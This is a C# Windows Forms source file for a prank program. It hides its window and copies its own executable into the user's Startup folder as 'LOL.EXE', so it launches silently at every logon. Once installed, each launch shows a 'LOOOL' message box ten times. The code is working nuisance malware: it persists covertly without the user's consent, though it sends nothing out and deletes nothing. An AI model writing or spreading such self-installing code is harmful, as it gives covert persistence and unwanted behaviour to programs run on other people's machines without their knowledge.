using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace WindowsFormsApplication7
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Hide();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (File.Exists(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "LOL.EXE")))
            {
                int lol = 0;
                while(lol < 10)
                {
                    lol++;
                    MessageBox.Show("LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOL");
                    //Hallo
                }
            }
            else
            {
                Hide();
                string test = Application.ExecutablePath;
                System.IO.File.Copy(test, System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "LOL.EXE"));
            }
            Application.Exit();
        }
    }
}
